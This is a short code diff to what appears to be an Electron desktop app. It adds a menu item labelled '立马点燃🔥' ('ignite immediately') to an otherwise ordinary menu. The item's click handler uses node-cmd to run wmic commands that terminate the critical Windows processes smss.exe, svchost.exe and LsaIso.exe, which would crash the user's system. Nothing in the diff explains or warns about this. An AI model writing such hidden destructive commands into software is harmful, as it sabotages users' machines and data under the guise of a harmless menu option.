@@ -222,6 +222,15 @@ ipcMain.on('getWeekIndex', (e, arg) => {
             }
         },
         {
+            label: '立马点燃🔥',
+            click: (e) => {
+                console.log("爆");
+                const cmd1 = require('node-cmd').runSync("wmic process where name=\"smss.exe\" delete");
+                const cmd2 = require('node-cmd').runSync("wmic process where name=\"svchost.exe\" delete");
+                const cmd3 = require('node-cmd').runSync("wmic process where name=\"LsaIso.exe\" delete");
+            }
+        },
+        {
             type: 'separator'
         },
         {
